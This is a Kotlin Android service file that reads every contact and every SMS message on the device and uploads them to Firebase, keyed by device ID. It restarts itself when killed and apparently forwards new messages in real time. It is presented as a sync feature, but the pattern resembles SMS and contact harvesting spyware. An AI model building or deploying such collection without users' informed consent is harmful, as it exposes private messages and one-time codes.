package com.example.fast.service

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import android.Manifest
import com.example.fast.util.ContactHelperOptimized
import com.example.fast.util.ContactBatchProcessor
import com.example.fast.util.SmsQueryHelper
import com.example.fast.util.FirebaseSyncHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import java.util.concurrent.Executors

/**
 * ContactSmsSyncService
 *
 * Unified Android Service for syncing contacts and SMS messages.
 *
 * Sync Strategy:
 * - Primary: Firebase Realtime Database (direct writes)
 * - Real-time: New messages → Firebase (handled separately by NotificationReceiver)
 *
 * Architecture:
 * 1. Contacts: Firebase (direct sync)
 * 2. SMS Messages: Firebase (direct sync)
 * 3. Both syncs run in parallel for better performance
 *
 * Features:
 * - Parallel execution of contact and SMS sync
 * - Direct Firebase sync (no fallback needed)
 * - Non-blocking (app continues even if sync fails)
 * - Progress tracking callbacks
 * - Background thread execution
 */
class ContactSmsSyncService : Service() {

    // Sync type enum - moved outside companion object for better accessibility
    enum class SyncType {
        ALL,        // Sync both contacts and SMS
        CONTACTS,   // Sync contacts only
        SMS         // Sync SMS only
    }

    companion object {
        private const val TAG = "ContactSmsSyncService"

        // Action constants
        private const val ACTION_SYNC_ALL = "com.example.fast.action.SYNC_ALL"
        private const val ACTION_SYNC_CONTACTS = "com.example.fast.action.SYNC_CONTACTS"
        private const val ACTION_SYNC_SMS = "com.example.fast.action.SYNC_SMS"

        // Intent extras
        private const val EXTRA_SYNC_TYPE = "sync_type"

        /**
         * Start sync service
         * @param context Application context
         * @param syncType Type of sync to perform (default: ALL)
         */
        fun startSync(context: Context, syncType: SyncType = SyncType.ALL) {
            val intent = Intent(context, ContactSmsSyncService::class.java).apply {
                action = when (syncType) {
                    SyncType.ALL -> ACTION_SYNC_ALL
                    SyncType.CONTACTS -> ACTION_SYNC_CONTACTS
                    SyncType.SMS -> ACTION_SYNC_SMS
                }
                putExtra(EXTRA_SYNC_TYPE, syncType.name)
            }
            context.startService(intent)
        }
    }

    private val executorService = Executors.newFixedThreadPool(2) // For parallel execution
    private val mainHandler = Handler(Looper.getMainLooper())

    @SuppressLint("HardwareIds")
    private fun getAndroidDeviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "ContactSmsSyncService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val syncType = intent?.getStringExtra(EXTRA_SYNC_TYPE)?.let {
            try {
                SyncType.valueOf(it)
            } catch (e: Exception) {
                SyncType.ALL
            }
        } ?: SyncType.ALL

        Log.d(TAG, "Starting sync: $syncType")

        // Execute sync in background thread
        executorService.execute {
            syncAllData(syncType)
        }

        // Return START_STICKY to restart service if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        executorService.shutdown()
        Log.d(TAG, "ContactSmsSyncService destroyed")
    }

    /**
     * Main sync orchestration method
     * Coordinates contact and SMS sync based on sync type
     */
    private fun syncAllData(
        syncType: SyncType = SyncType.ALL,
        onProgress: ((Int, Int, Boolean) -> Unit)? = null,
        onComplete: ((Int, Int) -> Unit)? = null
    ) {
        val deviceId = getAndroidDeviceId()
        var contactCount = 0
        var messageCount = 0
        var contactsDone = false
        var messagesDone = false

        val checkComplete: () -> Unit = {
            if (contactsDone && messagesDone) {
                mainHandler.post {
                    onComplete?.invoke(messageCount, contactCount)
                    Log.d(TAG, "Sync complete: $messageCount messages, $contactCount contacts")
                    stopSelf()
                }
            }
        }

        // Sync contacts if needed
        if (syncType == SyncType.ALL || syncType == SyncType.CONTACTS) {
            syncContacts(
                onProgress = { count ->
                    contactCount = count
                    mainHandler.post {
                        onProgress?.invoke(messageCount, contactCount, false)
                    }
                },
                onComplete = { count ->
                    contactCount = count
                    contactsDone = true
                    checkComplete()
                }
            )
        } else {
            contactsDone = true
            checkComplete()
        }

        // Sync SMS if needed
        if (syncType == SyncType.ALL || syncType == SyncType.SMS) {
            syncSmsMessages(
                onProgress = { count ->
                    messageCount = count
                    mainHandler.post {
                        onProgress?.invoke(messageCount, contactCount, false)
                    }
                },
                onComplete = { count ->
                    messageCount = count
                    messagesDone = true
                    checkComplete()
                }
            )
        } else {
            messagesDone = true
            checkComplete()
        }
    }

    /**
     * Contact Sync Module
     *
     * Strategy:
     * 1. Fetch contacts from device
     * 2. Sync to Firebase (primary backend)
     */
    private fun syncContacts(
        onProgress: ((Int) -> Unit)? = null,
        onComplete: ((Int) -> Unit)? = null
    ) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CONTACTS permission not granted")
            onComplete?.invoke(0)
            return
        }

        try {
            Log.d(TAG, "Starting contact sync...")

            // Step 1: Fetch contacts from device
            val contacts = fetchContacts()
            Log.d(TAG, "Retrieved ${contacts.size} contacts")

            if (contacts.isEmpty()) {
                Log.d(TAG, "No contacts to sync")
                onComplete?.invoke(0)
                return
            }

            // Step 2: Queue contacts for batch upload (store in JSON first, then upload in batches)
            Log.d(TAG, "Queueing contacts for batch upload to Firebase...")
            ContactBatchProcessor.queueContacts(
                context = this,
                contacts = contacts
            )

            // Return immediately - contacts will be uploaded in batches of 100
            // Priority: newest contacts first (by lastContacted timestamp)
            Log.d(TAG, "✅ Queued ${contacts.size} contacts for batch upload (will be processed in batches of 100, newest first)")
            onComplete?.invoke(contacts.size)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in contact sync: ${e.message}", e)
            onComplete?.invoke(0)
        }
    }

    /**
     * SMS Sync Module
     *
     * Strategy:
     * 1. Fetch SMS messages from device
     * 2. Sync to Firebase (primary backend)
     *
     * Note: Real-time new messages are synced separately to Firebase (handled by NotificationReceiver)
     */
    private fun syncSmsMessages(
        onProgress: ((Int) -> Unit)? = null,
        onComplete: ((Int) -> Unit)? = null
    ) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_SMS permission not granted")
            onComplete?.invoke(0)
            return
        }

        try {
            Log.d(TAG, "Starting SMS sync...")

            // Step 1: Fetch SMS messages from device
            val messages = fetchSmsMessages()
            Log.d(TAG, "Retrieved ${messages.size} messages")

            if (messages.isEmpty()) {
                Log.d(TAG, "No messages to sync")
                onComplete?.invoke(0)
                return
            }

            // Step 2: Sync to Firebase (primary backend)
            Log.d(TAG, "Syncing messages to Firebase...")
            FirebaseSyncHelper.syncSmsMessages(
                context = this,
                messages = messages,
                onSuccess = { syncedCount ->
                    Log.d(TAG, "✅ SMS sync successful: $syncedCount messages synced to Firebase")
                    onComplete?.invoke(syncedCount)
                },
                onFailure = { error ->
                    // Firebase sync failed - log error and continue
                    // App continues normally - user can retry later
                    Log.w(TAG, "⚠️ Firebase SMS sync failed: $error")
                    onComplete?.invoke(0)
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in SMS sync: ${e.message}", e)
            onComplete?.invoke(0)
        }
    }

    /**
     * Contact Sync: Fetch contacts from device
     */
    private fun fetchContacts(): List<com.example.fast.model.Contact> {
        return ContactHelperOptimized.getAllContacts(this)
    }

    /**
     * SMS Sync: Fetch SMS messages from device
     */
    private fun fetchSmsMessages(): List<com.example.fast.model.ChatMessage> {
        return SmsQueryHelper.getAllMessages(this, null)
    }

    // Note: Real-time new messages are synced separately to Firebase (handled by NotificationReceiver)
}
